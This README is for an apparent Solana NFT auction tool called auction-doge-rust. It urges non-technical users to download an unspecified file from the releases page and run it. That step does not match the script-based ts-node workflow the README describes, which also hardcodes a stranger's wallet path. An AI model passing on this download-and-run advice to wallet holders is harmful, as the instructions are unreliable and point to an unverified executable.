# 🐶 auction-doge-rust - Your Easy Way to Bid on NFTs

[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue.svg)](https://github.com/Luffysempai/auction-doge-rust/releases)

## 🚀 Getting Started

Welcome to **auction-doge-rust**, your straightforward tool for participating in NFT auctions. This guide will help you download the app and start bidding without any technical knowledge.

## 🛠️ Download & Install

To get started, follow these steps:

1. Visit the [Releases Page](https://github.com/Luffysempai/auction-doge-rust/releases).
2. Look for the latest version available.
3. Download the appropriate file for your operating system.

After downloading, locate the file on your computer and run it to install the application.

## 📥 Prerequisites

Before you can use auction-doge-rust, ensure you have the necessary tools installed on your system:

- **Node.js**: This is required to run the application. You can download it from [Node.js Official Website](https://nodejs.org/).
- **Yarn**: This package manager makes it easy to handle the project's dependencies. You can install it by following [Yarn Installation Guide](https://classic.yarnpkg.com/en/docs/install).

Additionally, you need to install `ts-node` globally. Open your command line or terminal and run:
```bash
npm install -g ts-node
```

## ✅ Prepare Your Solana Wallet

To interact with the auctions, you will need a Solana wallet set up. Ensure that your wallet is ready by checking the following path:
```
/home/fury/.config/solana/id.json
```

## 🎬 How to Use the Application

Once you have installed the application and set up your wallet, you can start using it. Here’s how:

1. Open the main script located at `/cli/script.ts`. This script contains all the functionalities you need.
2. You can view the types of program accounts at `/cli/types.ts`. This helps you understand how different parts of the application work together.
3. For an easy integration with JavaScript, the IDL can be found at `/cli/raffle.json`.

### 🔄 Testing the Application

If you want to test the script's functions, follow these instructions:

1. Modify the commands in the main functions of the `script.ts` file to call other available functions.
2. Make sure the `ANCHOR_WALLET` environment variable is correctly configured in the `package.json` file.
3. To run the application, execute the command:
   ```bash
   yarn ts-node
   ```

## 🎨 Features

### 🏗️ Create Your Auction

- As the creator, your NFTs will be safely stored in the auction address.
- When you create an auction, call the `create_open_auction` function. The NFT will be sent to the Program Derived Address (PDA) and the auction details will be stored securely.

### 📈 Place Bids

You can participate in various auctions by placing bids. The application tracks bids and updates participants on auction progress. 

### 🏆 Identify Winners

The highest bidder at the end of the auction is declared the winner. All transactions are processed securely on the Solana blockchain.

## 📜 License

This project is licensed under the MIT License. You are free to use, modify, and distribute the application under the terms outlined in the license.

## 🌐 Community and Support

If you have questions, consider joining the community for support. You can find discussions and help by visiting the issues section of the repository on GitHub. 

If you encounter any problems or have suggestions, feel free to create an issue. We appreciate your feedback to improve the project.

## 📍 Additional Resources

Here are a few useful resources to deepen your understanding:
- [Solana Documentation](https://docs.solana.com/)
- [Node.js Documentation](https://nodejs.org/en/docs/)
- [Yarn Documentation](https://yarnpkg.com/getting-started)

For any other questions related to usage or features, do not hesitate to seek assistance from the community or check the available documentation linked above.

Thank you for using auction-doge-rust. Happy bidding!